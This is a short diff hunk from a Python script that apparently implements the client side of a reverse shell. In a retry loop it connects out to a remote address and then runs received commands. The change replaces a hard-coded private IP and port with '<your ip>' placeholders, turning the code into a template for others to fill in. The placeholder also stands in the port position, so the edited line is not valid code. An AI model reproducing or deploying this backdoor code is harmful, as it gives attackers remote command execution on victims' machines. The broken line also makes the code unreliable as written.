@@ -61,7 +61,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            reverse.connect(('192.168.0.185', 54321))
+            reverse.connect(('<your ip>', <your ip>))
             commands()
             reverse.close()
             break
